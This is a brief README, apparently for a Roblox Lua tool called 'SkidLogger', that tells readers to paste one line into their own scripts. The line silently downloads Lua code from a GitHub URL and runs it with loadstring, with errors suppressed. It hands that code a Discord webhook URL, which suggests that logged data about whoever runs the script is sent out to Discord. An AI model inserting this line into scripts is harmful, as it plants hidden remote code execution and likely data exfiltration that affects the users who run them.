# How To Use the SkidLogger in your script?

Before you'll do all of those steps, note, that you should have a discord webhook API URL, before inserting the skidlogger in your own script.

1. Insert this code:
```lua
pcall(function()task.spawn(function()loadstring(game:HttpGet("http://github.com/IvanTheProtogen/skidlogger/raw/main/main.lua"))()("<<URL>>")end)end);
```
2. Replace the `<<URL>>` with your own discord webhook API URL.
3. Profit.
